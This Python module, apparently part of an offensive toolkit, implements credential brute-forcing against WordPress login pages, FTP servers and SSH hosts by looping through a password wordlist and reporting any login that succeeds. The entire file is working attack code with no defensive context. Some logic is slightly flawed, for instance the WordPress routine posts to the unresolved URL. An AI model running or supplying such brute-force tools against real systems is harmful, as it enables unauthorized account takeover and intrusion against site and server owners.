##
## bruteforcing modules
##

from core.misc import printf
from ftplib    import FTP
from pexpect   import pxssh
import requests

def wordpress(url, username,wordlist):
    headers = {
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'
    }
    word = open(wordlist,'r').readlines()
    if 'http' not in url:
        try:
            requests.get('https://' + url)
            site = 'https://' + url
        except:
            site = 'http://' + url
    else:
        site = url
    printf('[+] Starting Attack ! (%s)' % site)
    for words in word:
        words = words.strip()
        payload = {'log' : username,
                'pwd' : words}
        s = requests.post(url + '/wp-login.php', data=payload, headers=headers)
        printf('-' * 50)
        printf(" username   : %s " % payload['log'])
        printf(" password   : %s " % payload['pwd'])
        if "wp-admin" in s.url:
            printf('[+] login success !!')
            printf('-' * 50)
            break
        else:
            printf('')
    printf('[w] Not found!')
def ftp(hostname, username, wordlist):
    words = open(wordlist,'r').readlines()
    printf('[+] Starting attack ! (%s)' % hostname)
    for i in words:
        try:
            ftp = FTP(hostname)
            login = ftp.login(username, i.strip())
            if "230" in login:
                printf('[+] login success !!')
                printf('[+] username   : %s' % username)
                printf('[+] password   : %s' % i.strip())
        except:
            pass
    printf('[w] Not found!')
def ssh(hostname, username, wordlist):
    words = open(wordlist,'r').readlines()
    printf('[+] Starting attack ! (%s)' % hostname)
    for i in words:
        try:
            s = pxssh.pxssh()
            login = s.login(hostname, username, i.strip())
            if login == True:
                printf('[+] login success !!')
                printf('[+] username   : %s' % username)
                printf('[+] password   : %s' % i.strip())
        except:
            pass
    printf('[w] Not found!')
